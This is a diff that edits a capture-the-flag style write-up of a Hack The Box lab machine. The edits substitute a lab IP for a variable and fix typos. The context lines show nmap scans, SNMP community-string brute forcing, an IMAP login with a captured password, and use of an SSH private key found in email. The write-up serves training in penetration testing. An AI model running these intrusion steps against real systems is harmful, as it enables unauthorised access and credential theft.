@@ -24,7 +24,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.95 seconds
 ```
 
 ```
-$ nmap -p22,110,143,993,995 -sC -sV $ip
+$ nmap -p22,110,143,993,995 -sC -sV 10.129.73.237
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-09 18:44 EST
 Nmap scan report for 10.129.73.237
 Host is up (0.061s latency).
@@ -131,7 +131,7 @@ Scanning 1 hosts, 3219 communities
 Nice! We were able to bruteforce it and find the community string of `backup`. We can use `snmpwalk` to interact with the service.
 
 ```
-$snmpwalk -c backup -v2c $ip
+$snmpwalk -c backup -v2c 10.129.73.237
 
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
@@ -226,7 +226,7 @@ tag login tom NMds732Js2761
 tag OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
 ```
 
-Logged in! Now let's try and dig around and find some emails. First we can find out inbox.
+Logged in! Now let's try and dig around and find some emails. First we can find our inbox.
 
 ```
 tag list "" *
@@ -316,7 +316,7 @@ XvSb8cNlUIWdRwAAAAt0b21ATklYSEFSRAECAwQFBg==
 )
 ```
 
-Nice it looks like an admin sent an SSH private key to our user `tom`! Let's try and login. We can copy and paste the key starting from the `BEGIN OPENSSH` line to the `END OPENSSH` line into a file on our locala machine. Then we need to change the file permissions so only we can read it so SSH accepts it.
+Nice. it looks like an admin sent an SSH private key to our user `tom`! Let's try and login. We can copy and paste the key starting from the `BEGIN OPENSSH` line to the `END OPENSSH` line into a file on our locala machine. Then we need to change the file permissions so only we can read it so SSH accepts it.
 
 ```
 $ vim id_rsa
@@ -363,7 +363,7 @@ Last login: Wed Feb  5 18:55:07 2025 from 10.10.14.246
 tom@NIXHARD:~$
 ```
 
-We're in! Now to try and find the credentials to our `HTB` entry in the database. I searched the running processes to determine what databse is running which I assumed was going to be sql.
+We're in! Now to try and find the credentials to our `HTB` entry in the database. I searched the running processes to determine what database was running which I assumed was going to be sql.
 
 ```
 tom@NIXHARD:~$ ps aux | grep sql
